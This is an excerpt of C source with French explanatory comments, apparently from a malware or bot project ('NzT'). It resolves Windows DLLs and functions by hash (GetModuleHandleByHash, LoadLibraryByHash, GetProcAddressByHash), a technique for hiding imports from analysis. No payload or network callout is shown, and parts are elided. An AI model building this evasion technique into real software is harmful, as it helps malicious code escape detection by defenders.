...
// Définition d'une structure pour stocker le hash d'un module et un pointeur vers son handle
struct API_MODULE {
	DWORD ModuleHash;  // Le hash du module
	HMODULE* Module;   // Un pointeur vers le handle du module
};

// La fonction pour récupérer les modules
BOOL GetModules() {
	DWORD i;

	// Tableau contenant les informations sur les modules à récupérer
	API_MODULE ModuleList[] =
	{
		{HASH_KERNEL32, &NzT.Modules.Kernel32}  // HASH_KERNEL32 est le hash du module Kernel32
		// NzT.Modules.Kernel32 est un pointeur vers le handle du module Kernel32
	};

	// Parcours de la liste des modules
	for (i = 0; i < sizeof(ModuleList) / sizeof(API_MODULE); i++) {
		// Récupération du handle du module en utilisant son hash
		// en utilisant une fonction GetModuleHandleByHash (non définie ici)
		// Si le handle récupéré est 0 (ce qui signifie que le module n'a pas été trouvé)
		if ((*ModuleList[i].Module = GetModuleHandleByHash(ModuleList[i].ModuleHash)) == 0) {
			return FALSE;  // Renvoie FALSE si un module n'est pas trouvé
		}
	}

	return TRUE;  // Renvoie TRUE si tous les modules ont été récupérés avec succès
}

// Fonction pour charger le module Ntdll
BOOL LoadNtdllModule() {
	// Déclaration d'une structure pour le module Ntdll
	API_MODULE ModuleList[] =
	{
		{HASH_NTDLL, &NzT.Modules.Ntdll}  // HASH_NTDLL est le hash du module Ntdll
		// NzT.Modules.Ntdll est un pointeur vers le handle du module Ntdll
	};
	...
	for (DWORD i = 0; i < sizeof(ModuleList) / sizeof(API_MODULE); i++) {
		...
		// Si le handle récupéré est 0 (ce qui signifie que le module n'a pas été trouvé)
		if ((*ModuleList[i].Module = GetModuleHandleByHash(ModuleList[i].ModuleHash)) == 0) {
			return FALSE;  // Renvoie FALSE si le module n'est pas trouvé
		}
	}

	return TRUE;  // Renvoie TRUE si le module a été chargé avec succès
}

// Fonction pour charger des fonctions du module Ntdll en utilisant leur hash
BOOL LoadNtdll() {
	// Définition d'une structure pour les informations sur les API
	API_T ApiList[] = {
		// Liste des fonctions avec leur hash et leur emplacement dans la mémoire
	...
	// Parcours de la liste des API
	for (DWORD i = 0; i < sizeof(ApiList) / sizeof(API_T); i++) {
		// Obtention de l'adresse des fonctions en utilisant leur hash
		*ApiList[i].Function = GetProcAddressByHash(*ApiList[i].Module, ApiList[i].FunctionHash);
		// Assignation de l'adresse des fonctions trouvées aux pointeurs correspondants
	}

	return TRUE; // Retourne TRUE une fois que toutes les fonctions ont été chargées
}
...
// Fonction pour charger différents modules en utilisant leur hash
BOOL LoadModules() {
	// Définition d'une structure pour les informations sur les modules
	API_MODULE ModuleList[] = {
		// Liste des modules avec leur hash et leur emplacement dans la mémoire
		{HASH_USER32, &NzT.Modules.User32},     // User32
		{HASH_WININET, &NzT.Modules.Wininet},   // Wininet
		{HASH_SHELL32, &NzT.Modules.Shell32},   // Shell32
		{HASH_ADVAPI32, &NzT.Modules.Advapi32}  // Advapi32
	};

	// Parcours de la liste des modules
	for (DWORD i = 0; i < sizeof(ModuleList) / sizeof(API_MODULE); i++) {
		// Chargement du handle du module en utilisant son hash
		// Si le handle du module est 0, cela indique un échec dans le chargement
		if ((*ModuleList[i].Module = LoadLibraryByHash(ModuleList[i].ModuleHash)) == 0)
			return FALSE; // Retourne FALSE si le chargement d'un module échoue
	}

	return TRUE; // Retourne TRUE une fois que tous les modules ont été chargés avec succès
}

// Fonction pour charger des fonctions du module Kernel32 en utilisant leur hash
BOOL LoadKernel32() {
	// Définition d'une structure pour les informations sur les API du module Kernel32
	API_T ApiList[] = {
		// Liste des fonctions avec leur hash et leur emplacement dans la mémoire
		// Chaque ligne représente une fonction spécifique du module Kernel32 avec son hash et son emplacement pour le pointeur de la fonction
...
// Fonction pour charger des fonctions spécifiques à partir de différents modules en utilisant leur hash
BOOL LoadFunctions() {
	// Définition d'une structure pour les informations sur les API
	API_T ApiList[] = {
		// Liste des fonctions avec leur hash et leur emplacement dans le module mémoire correspondant
	...
	for (DWORD i = 0; i < sizeof(ApiList) / sizeof(API_T); i++) {
		// Obtention de l'adresse des fonctions en utilisant leur hash
		// Si l'adresse de la fonction est NULL, cela indique un échec dans le chargement
		if ((*ApiList[i].Function = GetProcAddressByHash(*ApiList[i].Module, ApiList[i].FunctionHash)) == NULL)
			return FALSE; // Retourne FALSE si le chargement d'une fonction échoue
	}

	return TRUE; // Retourne TRUE une fois que toutes les fonctions ont été chargées avec succès
}
